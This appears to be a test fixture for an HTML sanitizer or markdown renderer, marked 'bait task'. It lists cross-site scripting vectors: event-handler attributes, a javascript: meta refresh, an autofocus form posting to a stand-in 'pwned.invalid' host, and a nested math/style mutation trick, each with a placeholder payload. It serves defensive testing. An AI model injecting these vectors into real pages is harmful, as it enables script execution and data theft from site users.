- [ ] bait task

Inline event handlers in raw HTML.

<img src="x" onerror="@@PAYLOAD@@">

<details open ontoggle="@@PAYLOAD@@"><summary>details</summary>body</details>

<svg onload="@@PAYLOAD@@"><rect width="10" height="10"/></svg>

<video><source onerror="@@PAYLOAD@@"></video>

<a href="#" onclick="@@PAYLOAD@@">onclick link</a> and <span onmouseover="@@PAYLOAD@@">hover me</span>

<body onload="@@PAYLOAD@@">

<meta http-equiv="refresh" content="0;url=javascript:@@PAYLOAD@@">

<form action="https://pwned.invalid/form"><input type="text" value="x" autofocus onfocus="@@PAYLOAD@@"><button>go</button></form>

<math><mtext><table><mglyph><style><img src=x onerror="@@PAYLOAD@@"></style></mglyph></table></mtext></math>
